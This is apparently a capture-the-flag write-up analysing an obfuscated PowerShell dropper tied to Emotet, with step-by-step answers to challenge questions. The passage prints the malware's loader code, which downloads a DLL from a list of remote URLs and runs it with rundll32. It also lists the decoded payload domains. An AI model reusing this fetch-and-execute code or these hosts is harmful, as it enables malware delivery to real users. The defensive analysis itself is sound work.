# Malicious Power Shell Analysis

Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption.  <br>

GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack? 

# Questions

## What security protocol is being used for the communication with a malicious domain? 

First thing first we need to decode the b64 string present in the **ps_script.txt** file. I copied the payload to a file (**enc**) and piped it to the base64 program, thus generating the **decoded1** file

```bash
cat enc | base64 -d > decoded1
```

The powershell code is mostly reconstructed with format strings and word casing (for example: eXeCUte) because powershell is case insensitive so it does not affect the payload. <br>

We can see directly the usage of TLS
```
sEcuRITYproT`o`c`ol" = ('T'+('ls'+'12'))
```
**Answer:** TLS 1.2

## What directory does the obfuscated PowerShell create? (Starting from \HOME\)

If we look around (or use the search function in a text editor) we can see the presence of two "HOME" words (luckily they malware guy did not encode this one). The important one is the second and we can see that it creates a path with concatenation and string formating assigning the result of it to a variable

```ps1
$Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG][chAr]92))
```

If we use the powershell interface for linux, we can see the name it resolves to

```ps1
> $Imd1yck
(..)\Db_bh30\Yf5be5g\
```

**Answer:** \HOME\Db_bh30\Yf5be5g\

## What file is being downloaded (full name)?

So by reading the payload (yet obfuscated) we can see, close to the above folder creation, a **.dll** file being create in that folder too. <br>

```ps1
$Swrp6tc = (('A6'+'9')+'S');$X27H=('C3'+'3O');$Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG][chAr]92))+$Swrp6tc+(('.'+'dl')+'l');
```

The file name resides in the variable **$Swrp6tc** and, if we use the same approach as before (running the code and see the output), of course in a safe way, we can see the result

**Answer:** A69S.dll

## What is used to execute the downloaded file?

Again, without fully decode the payload (because it is not so obfuscated and is readable), we can see the answer within the **trycatch** inside the **foreach** loop

```ps1
foreach ($Bm5pw6z in $B9fhbyv){try{(&('New'+'-Objec'+'t') SysTem.nEt.WEBcLIeNT)."do`WNl`OaD`FIlE"($Bm5pw6z, $Imd1yck);$Z10L=('A9'+'2Q');If ((&('Ge'+'t-It'+'em') $Imd1yck)."len`G`TH" -ge 35698) {&('r'+'undl'+'l32') $Imd1yck,(('Co'+'nt')+'r'+('ol'+'_RunD'+'L')+'L')."T`OSt`RiNG"();$R65I=('Z'+('09'+'B'));break;$K7_H=('F1'+'2U')}}catch{}}$W54I=(('V9'+'5')+'O')
``` 

More specifically, in the line of code below

```ps1
&('r'+'undl'+'l32')
``` 
**Answer:** rundll32

## What is the domain name of the URI ending in ‘/6F2gd/'

Before the foreach loop the creation of a list-like structure is visible (this list is also used as the enumerator for the loop itself). The name of the variable, using the list, is **$B9fhbyv**
```ps1 
$B9fhbyv=(']'+('a'+'nw[3s://adm'+'int'+'k.c'+'o'+'m/'+'w')+('p-adm'+'in/'+'L/')+'@'+(']a'+'n'+'w[3s')+':'+'/'+'/m'+('ike'+'ge')+('e'+'r'+'inck.')+('c'+'om')+('/c/'+'Y'+'Ys')+'a'+('/@]'+'anw'+'['+'3://free'+'lanc'+'e'+'rw')+('ebdesi'+'gnerh'+'yd')+('er'+'aba')+('d.'+'com/')+('cgi'+'-bin'+'/S')+('/'+'@'+']anw')+('[3'+'://'+'etdog.co'+'m'+'/w')+('p-'+'co')+'nt'+('e'+'nt')+('/n'+'u/@')+(']a'+'nw[3')+'s'+('://'+'www'+'.hintu'+'p.c')+('o'+'m.')+('b'+'r/')+'w'+('p'+'-co')+('n'+'ten')+('t'+'/dE/'+'@]a'+'nw[3://'+'www.')+'s'+('tm'+'arouns'+'.')+('ns'+'w')+('.'+'edu.au/p'+'a'+'y'+'pal/b8')+('G'+'/@]')+('a'+'nw[')+('3:'+'/')+('/'+'wm.mcdeve'+'lop.net'+'/'+'c'+'on'+'t'+'e')+('nt'+'/')+'6'+('F2'+'gd/'))."RE`p`lACe"(((']a'+'n')+('w'+'[3')),([array]('sd','sw'),(('h'+'tt')+'p'),'3d')[1])."s`PLIT"($C83R + $Cvmmq4o + $F10Q);$Q52M=('P'+('0'+'5K'));

foreach ($Bm5pw6z in $B9fhbyv)
```

If we just reconstruct the list in a powershell client, and obviously print it, we can see the answer (below)
```ps1 
> $B9fhbyv
https://admintk.com/wp-admin/L/@https://mikegeerinck.com/c/YYsa/@http://freelancerwebdesignerhyderabad.com/cgi-bin/S/@http://etdog.com/wp-content/nu/@https://www.hintup.com.br/wp-content/dE/@http://www.stmarouns.nsw.edu.au/paypal/b8G/@http://wm.mcdevelop.net/content/6F2gd/
```
**Answer:** wm.mcdevelop.net

## Based on the analysis of the obfuscated code, what is the name of the malware?

Well, this cannot be really answered without a bit of research... 

**Answer:** emotet